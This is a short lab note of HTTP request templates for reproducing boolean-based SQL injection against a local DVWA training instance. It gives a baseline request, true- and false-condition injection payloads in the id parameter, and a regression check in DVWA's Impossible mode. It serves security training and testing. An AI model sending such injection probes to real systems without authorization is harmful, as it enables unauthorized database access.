# SQLi Reproduction Requests

These are sanitized Repeater templates for the local DVWA instance at `127.0.0.1:4280`. Replace the Cookie placeholder with the current local session; never commit a real session cookie.

## Baseline

```http
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: 127.0.0.1:4280
Cookie: PHPSESSID=<local-session>; security=low
Connection: close
```

Expected in Low mode: `First name: admin` and `Surname: admin`.

## True-condition differential

```http
GET /vulnerabilities/sqli/?id=1%27%20AND%20%271%27%3D%271&Submit=Submit HTTP/1.1
Host: 127.0.0.1:4280
Cookie: PHPSESSID=<local-session>; security=low
Connection: close
```

Expected in Low mode: the `admin` row remains visible.

## False-condition differential

```http
GET /vulnerabilities/sqli/?id=1%27%20AND%20%271%27%3D%272&Submit=Submit HTTP/1.1
Host: 127.0.0.1:4280
Cookie: PHPSESSID=<local-session>; security=low
Connection: close
```

Expected in Low mode: no user row is rendered. Compare response content, not only HTTP status.

## Fixed-mode regression

After changing DVWA Security to `Impossible`, repeat the baseline and one condition input with the current `security=impossible` cookie. The normal ID should still return `admin`; the SQL syntax input should not return a row. Restore Low after the comparison if continuing the vulnerable-mode exercise.
